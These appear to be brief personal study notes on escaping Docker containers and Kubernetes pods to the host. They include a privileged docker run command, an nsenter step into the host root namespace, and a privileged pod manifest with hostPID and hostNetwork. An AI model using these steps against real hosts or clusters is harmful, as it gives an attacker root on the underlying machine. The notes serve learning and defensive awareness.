## Privilige escalation

### [[Containers]]

Breakout from docker can be performed by using 

```sh
docker run --pid=host --privileged <container>
```

The **--pid** flag moves docker into the host namespace,
where we can use **nsenter -t 1 -a bash** to enter the host root namespace.

- link: https://isovalent.com/blog/post/2021-11-container-escape/

### [[Kubernetes]]

Similarly to the docker example, constructing a yaml as:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-the-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privileged-the-pod
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
```

If **securityContext.privileged** is **true**, the conteiner is also moved into the host namespace.
The attack then works similarly as the docker one.